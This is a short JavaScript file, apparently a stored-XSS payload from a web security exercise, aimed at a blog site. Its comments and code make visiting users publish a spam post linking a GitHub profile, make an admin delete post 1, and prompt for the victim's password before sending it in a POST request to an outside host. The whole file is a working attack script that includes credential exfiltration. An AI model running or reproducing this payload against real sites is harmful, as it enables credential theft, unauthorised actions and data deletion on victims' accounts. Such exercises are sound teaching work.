// Causes regular users to make a blogpost that advertises your shady hacker website.
// Makes an admin delete 1 or more posts.
// Prompt a user to enter their password and send that password in an AJAX request to your shady hacker website.
function createPost() {
    var post = {
        title: "Checkout my github profile!!!",
        content: "Come look at my github profile!!! <a href='https://github.com/yuhanwangg'>Yuhan Wang</a>"
    };
    let xhttp = new XMLHttpRequest();
    xhttp.open("POST", "/posts/new", true);
    xhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    xhttp.send(JSON.stringify(post));
}
function deletePost() {
    var xhttp = new XMLHttpRequest();
    xhttp.open("POST", "/posts/1/delete", true);
    xhttp.send();
}
function promptPassword() {
    var stolenpassword = window.prompt("Enter your password");
    var xhttp = new XMLHttpRequest();
    xhttp.open("POST", "https://github.com/yuhanwangg", true);
    xhttp.send(stolenpassword);
}

createPost();
deletePost();
promptPassword();